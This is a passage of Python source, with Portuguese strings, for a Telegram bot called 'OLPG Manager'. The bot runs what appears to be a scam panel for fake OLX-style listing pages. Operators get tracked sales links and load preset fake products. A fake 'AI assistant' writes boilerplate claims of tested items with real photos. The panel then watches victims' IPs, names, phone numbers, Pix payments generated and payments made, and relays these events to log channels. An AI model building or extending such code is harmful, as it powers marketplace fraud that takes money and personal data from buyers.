def clean_and_validate_url(url_str: str) -> str:
    """Valida e limpa URLs de imagem mantendo apenas links validos https/http."""
    u = url_str.strip()
    if u.startswith("http://") or u.startswith("https://"):
        return u
    return ""

def clean_and_validate_phone(phone_str: str) -> str:
    """Remove caracteres não numéricos e garante DDI 55."""
    nums = re.sub(r"\D", "", phone_str)
    if len(nums) in (10, 11):
        nums = "55" + nums
    return nums if len(nums) >= 12 else "5511999999999"

def generate_ai_ad(product_raw: str) -> dict:
    """Assistente Inteligente de IA: gera descrição rica e preço estimado."""
    p_name = product_raw.strip()
    title = p_name.title()
    desc = (
        f"{title} em excelente estado de conservação, testado e 100% funcional. "
        f"Sem marcas profundas de uso ou avarias. Motivo da venda: upgrade. "
        f"Fotos reais do produto. Aceito propostas plausíveis. Entrega rápida."
    )
    # Estimativa simples inteligente por palavra chave
    lower = p_name.lower()
    price = "650.00"
    if "iphone" in lower or "apple" in lower:
        price = "1450.00"
    elif "ps5" in lower or "playstation" in lower:
        price = "2400.00"
    elif "notebook" in lower or "laptop" in lower or "dell" in lower:
        price = "1850.00"
    elif "tv" in lower or "smart" in lower:
        price = "1100.00"

    return {
        "product_name": title,
        "product_price": price,
        "product_description": desc
    }

# ─── TEXT BUILDERS ────────────────────────────────────────────────────────────
def _stats_text(tg_id):
    h24 = get_tg_stats(tg_id, 24); h168 = get_tg_stats(tg_id, 168)
    return (
        f"📊 <b>Suas Estatísticas</b>\n\n"
        f"<b>── Últimas 24h ──</b>\n"
        f"👁 Visitas: <b>{h24['entries']}</b>  🛒 Compra: <b>{h24['click_buy']}</b>\n"
        f"📝 Leads: <b>{h24['converted']}</b>  ✅ Pagos: <b>{h24['paid']}</b>\n"
        f"📈 Conversão: <b>{h24['conv_rate']}%</b>\n\n"
        f"<b>── 7 dias ──</b>\n"
        f"👁 Visitas: <b>{h168['entries']}</b>  ✅ Pagos: <b>{h168['paid']}</b>\n"
        f"💸 Pix: <b>{h168['pix_generated']}</b>  📈 <b>{h168['conv_rate']}%</b>"
    )

def _events_text(tg_id):
    evs = get_tg_events(tg_id, 12)
    if not evs: return "📋 Nenhum evento ainda. Compartilhe seu link!"
    lines = []
    for ev in evs:
        d = ev.get("data", {})
        extra = f" · {str(d.get('name',''))[:20]}" if "name" in d else (f" · {d['phone']}" if "phone" in d else "")
        lines.append(f"• {_ev(ev['type'])} — <code>{ev.get('ip','?')}</code>{extra} <i>{_ts(ev.get('ts',0))}</i>")
    return "📋 <b>Eventos Recentes:</b>\n\n" + "\n".join(lines)

def _sessions_text(tg_id):
    ss = get_tg_sessions(tg_id, 8)
    if not ss: return "👥 Nenhuma sessão ainda."
    lines = []
    for s in ss:
        status = "🟢 Ativo" if not s.get("left_at") else "⚫"
        conv = " ✅" if s.get("converted") else ""
        lines.append(f"• <code>{s.get('ip','?')}</code> {status}{conv} <i>{_ts(s.get('entered_at',0))}</i>")
    return "👥 <b>Sessões Recentes:</b>\n\n" + "\n".join(lines)

def _cfg_preview(tg_id):
    c = get_all_cfg(tg_id)
    return (
        f"⚙️ <b>Configuração Atual:</b>\n\n"
        f"📦 <b>Produto:</b> {c['product_name']}\n"
        f"💰 <b>Preço:</b> R$ {c['product_price']}\n"
        f"📱 <b>WhatsApp:</b> +{c['whatsapp_number']}\n"
        f"👤 <b>Vendedor:</b> {c['seller_name']}\n\n"
        f"O que deseja editar?"
    )

# ─── CALLBACK HANDLER ─────────────────────────────────────────────────────────
def handle_callback(chat_id, msg_id, cb_id, tg_id, username, data):
    ensure_user(tg_id, username)
    answer_cb(cb_id)

    if data == "m_back":
        edit_msg(chat_id, msg_id, f"📋 <b>Painel OLPG</b>\n\nOlá, <b>{username}</b>!", markup=kb_main())
    elif data == "m_stats":
        edit_msg(chat_id, msg_id, _stats_text(tg_id), markup=kb_back())
    elif data == "m_events":
        edit_msg(chat_id, msg_id, _events_text(tg_id), markup=kb_back())
    elif data == "m_sessions":
        edit_msg(chat_id, msg_id, _sessions_text(tg_id), markup=kb_back())
    elif data == "m_link":
        slug = get_slug(tg_id)
        edit_msg(chat_id, msg_id,
            f"🔗 <b>Seu Link Exclusivo:</b>\n\n<code>{BASE_URL}/s/{slug}</code>\n\n"
            f"Cada visita fica rastreada e criptografada.", markup=kb_back())
    elif data == "m_admin_web":
        token = ""
        try:
            import bot as _ab
            token = _ab.generate_admin_token(tg_id)
        except Exception as e:
            logger.error(f"[TOKEN GEN CB] {e}")
        
        base = BASE_URL.rstrip('/')
        admin_url = f"{base}/admin?token={token}" if token else f"{base}/admin"
        
        edit_msg(chat_id, msg_id,
            f"🔐 <b>Painel Web de Administração Criptografado</b>\n\n"
            f"Seu token de sessão temporário (24h):\n"
            f"<code>{token}</code>\n\n"
            f"🔗 <b>Link Direto Criptografado com Token:</b>\n"
            f"<code>{admin_url}</code>\n\n"
            f"⚠️ <i>Apenas seu usuário possui esta chave de acesso tokenizada.</i>", markup=kb_back())
    elif data == "m_refresh":
        h24 = get_tg_stats(tg_id, 24)
        edit_msg(chat_id, msg_id,
            f"🔄 Atualizado! <i>{_ts(time.time())}</i>\n\n"
            f"24h: 👁{h24['entries']}  📝{h24['converted']}  ✅{h24['paid']}  📈{h24['conv_rate']}%",
            markup=kb_main())
    elif data == "m_config":
        edit_msg(chat_id, msg_id, _cfg_preview(tg_id), markup=kb_config())
    elif data == "m_presets":
        edit_msg(chat_id, msg_id, "✨ <b>Selecione um Modelo Pronto (Preset):</b>\n\nCom 1 clique, sua página será configurada com fotos, descrição realista e preço!", markup=kb_presets())
    elif data in PRESET_MODELS:
        model = PRESET_MODELS[data]
        for k, v in model.items():
            set_cfg(tg_id, k, v)
        edit_msg(chat_id, msg_id, f"✅ <b>Modelo Carregado com Sucesso!</b>\n\n📦 <b>{model['product_name']}</b>\n💰 R$ {model['product_price']}\n\nSeu link foi atualizado!", markup=kb_config())
    elif data == "m_ai":
        edit_msg(chat_id, msg_id, "🤖 <b>Assistente Inteligente de IA</b>\n\nClique no botão abaixo e envie o nome de qualquer produto (ex: <code>Notebook Asus i5</code>) para que a IA crie o anúncio completo com descrição e valor de mercado!", markup=kb_ai())
    elif data == "ai_gen":
        set_state(chat_id, "await_ai_gen")
        edit_msg(chat_id, msg_id, "🤖 <b>Assistente IA</b>\n\nEnvie o nome do produto que deseja anunciar (ex: <i>iPhone 12 128GB Azul</i>):", markup=kb_back())
    elif data == "m_help":
        edit_msg(chat_id, msg_id,
            "🆘 <b>Comandos:</b>\n\n/start /menu /stats /link /eventos /config /ajuda",
            markup=kb_back())
    elif data in CFG_FIELDS:
        db_key, prompt = CFG_FIELDS[data]
        set_state(chat_id, f"await_{db_key}")
        edit_msg(chat_id, msg_id, prompt, markup=kb_back())

# ─── STATE INPUT ──────────────────────────────────────────────────────────────
def handle_state_input(chat_id, tg_id, text, state):
    if state == "await_ai_gen":
        ai_res = generate_ai_ad(text)
        set_cfg(tg_id, "product_name", ai_res["product_name"])
        set_cfg(tg_id, "product_price", ai_res["product_price"])
        set_cfg(tg_id, "product_description", ai_res["product_description"])
        clear_state(chat_id)
        send_msg(chat_id,
            f"✨ <b>Anúncio Gerado por IA com Sucesso!</b>\n\n"
            f"📦 <b>Nome:</b> {ai_res['product_name']}\n"
            f"💰 <b>Preço Sugerido:</b> R$ {ai_res['product_price']}\n"
            f"📝 <b>Descrição:</b>\n<i>{ai_res['product_description']}</i>",
            markup=kb_config())
        return

    if not state.startswith("await_"):
        clear_state(chat_id); return
    key = state[len("await_"):]
    val = text.strip()

    # Validação inteligente por tipo de campo
    if key == "product_price":
        val = clean_and_validate_price(val)
    elif key == "product_image":
        clean_u = clean_and_validate_url(val)
        if not clean_u:
            send_msg(chat_id, "⚠️ <b>URL de Imagem Inválida!</b>\n\nInsira um link válido começando com <code>http://</code> ou <code>https://</code>.", markup=kb_config())
            return
        val = clean_u
    elif key == "whatsapp_number":
        val = clean_and_validate_phone(val)

    set_cfg(tg_id, key, val)
    clear_state(chat_id)
    send_msg(chat_id,
        f"✅ <b>Salvo com Validação!</b>\n<code>{key}</code> → <code>{val[:80]}</code>",
        markup=kb_config())

# ─── MAIN DISPATCHER ──────────────────────────────────────────────────────────
def dispatch(update: dict):
    try:
        if "callback_query" in update:
            cq = update["callback_query"]
            handle_callback(
                cq["message"]["chat"]["id"], cq["message"]["message_id"],
                cq["id"], cq["from"]["id"],
                cq["from"].get("first_name","Agente"),
                cq.get("data",""))
            return

        if "message" not in update: return
        msg = update["message"]
        chat_id  = msg["chat"]["id"]
        tg_id    = msg.get("from",{}).get("id", 0)
        username = msg.get("from",{}).get("first_name","Agente")
        text     = msg.get("text","")
        if not text: return

        ensure_user(tg_id, username)
        state = get_state(chat_id)
        if state and not text.startswith("/"):
            handle_state_input(chat_id, tg_id, text, state); return

        cmd = text.split()[0].lower().split("@")[0]
        slug = get_slug(tg_id)
        link = f"{BASE_URL}/s/{slug}"

        if cmd in ("/start", "/admin_link", "/admin"):
            token = ""
            try:
                import bot as _ab
                token = _ab.generate_admin_token(tg_id)
            except Exception as e:
                logger.error(f"[TOKEN GEN] {e}")

            base = BASE_URL.rstrip('/')
            admin_url = f"{base}/admin?token={token}" if token else f"{base}/admin"

            admin_kb = _kb([
                [{"text": "💰 Abrir Carteira / Painel OLX", "web_app": {"url": admin_url}}],
                [{"text": "📊 Minhas Stats", "callback_data": "m_stats"},
                 {"text": "📋 Eventos", "callback_data": "m_events"}],
                [{"text": "⚙️ Configurar Página", "callback_data": "m_config"},
                 {"text": "🔗 Meu Link", "callback_data": "m_link"}],
                [{"text": "✨ Modelos Prontos (Presets)", "callback_data": "m_presets"},
                 {"text": "🤖 Assistente IA", "callback_data": "m_ai"}],
                [{"text": "👥 Sessões", "callback_data": "m_sessions"},
                 {"text": "🔄 Atualizar", "callback_data": "m_refresh"}],
                [{"text": "❓ Ajuda", "callback_data": "m_help"}],
            ])

            send_msg(chat_id,
                f"🟣 <b>OLPG Manager — Painel Web</b>\n\n"
                f"Olá, <b>{username}</b>!\n\n"
                f"🔗 <b>Seu link único de vendas:</b>\n<code>{link}</code>\n\n"
                f"🔑 <b>Seu Token de Acesso WebAdmin:</b>\n<code>{admin_url}</code>\n\n"
                f"Clique no botão abaixo para abrir o seu painel WebApp estilo Carteira do 7!",
                markup=admin_kb)
        elif cmd.startswith("/set_log_"):
            # Ex: /set_log_visita, /set_log_lead, /set_log_pix, /set_log_pago, /set_log_all
            log_type = cmd.replace("/set_log_", "")
            set_log_channel(log_type, chat_id, msg.get("chat", {}).get("title", f"Canal #{chat_id}"))
            send_msg(chat_id, f"✅ <b>Canal de Logs Configurado!</b>\nEste grupo/canal agora receberá logs de <b>{log_type.upper()}</b> em tempo real.")
        elif cmd in ("/menu","/painel"):
            send_msg(chat_id, f"📋 <b>Painel OLPG</b>\n\nOlá, <b>{username}</b>!", markup=kb_main())
        elif cmd == "/stats":
            send_msg(chat_id, _stats_text(tg_id), markup=kb_back())
        elif cmd == "/link":
            send_msg(chat_id, f"🔗 <b>Seu Link:</b>\n\n<code>{link}</code>", markup=kb_back())
        elif cmd == "/eventos":
            send_msg(chat_id, _events_text(tg_id), markup=kb_back())
        elif cmd == "/config":
            send_msg(chat_id, _cfg_preview(tg_id), markup=kb_config())
        elif cmd in ("/admins", "/grupo"):
            send_msg(chat_id,
                f"👥 <b>Gestão de Administradores do Grupo</b>\n\n"
                f"• Usuário: <b>{username}</b> (ID: <code>{tg_id}</code>)\n"
                f"• Status de Acesso: <b>AUTORIZADO & SINCRONIZADO</b> ✅\n\n"
                f"Todos os membros autorizados no grupo possuem acesso em tempo real às métricas reais.",
                markup=kb_back())
        elif cmd in ("/ajuda","/help"):
            send_msg(chat_id,
                "🆘 <b>Ajuda OLPG</b>\n\n/start /menu /stats /link /eventos /config /admins /ajuda",
                markup=kb_back())
        else:
            send_msg(chat_id, "❓ Use /menu para o painel.", markup=kb_main())
    except Exception as e:
        logger.error(f"[DISPATCH] {e}", exc_info=True)